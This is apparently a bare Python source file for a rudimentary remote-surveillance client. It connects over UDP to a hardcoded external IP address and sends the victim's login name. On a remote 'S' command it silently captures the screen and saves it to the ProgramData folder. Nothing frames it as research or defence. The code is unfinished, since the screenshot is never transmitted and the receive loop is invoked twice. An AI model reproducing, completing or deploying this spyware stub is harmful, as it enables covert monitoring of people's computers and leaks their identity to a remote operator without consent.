import os
import socket
import threading
from PIL import ImageGrab

######################################
######### GLOBAL VARIABLES ###########
######################################

server_address = '81.30.92.28'
server_port = 8008
server = server_address, server_port

start_message = f'{os.getlogin()} connected to server'
######################################
############# FUNCTIONS ##############
######################################

def receive():
  while True:
    data = client_socket.recv(1024)
    #print(data.decode('utf-8'))
    message = data.decode()

    if message == 'S':
        screen = ImageGrab.grab()
        screen.save(os.getenv("ProgramData") + '\\Screenshot.jpg')
        screen = open('C:\\ProgramData\\Screenshot.jpg', 'rb')
        print('Screen was created')


######################################
######### CONNECT TO SERVER ##########
######################################

client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client_socket.bind(('', 0))
client_socket.sendto(start_message.encode('utf-8'), server)
print(start_message)

######################################
############# EXECUTION ##############
######################################

thread = threading.Thread(target=receive)
thread.start()

message = receive()
print(f'MSG: {message}')

#while True:
#    message = input('Enter a message\n->')
#    client_socket.sendto(('[' + alias + ']' + message).encode('utf-8'), server)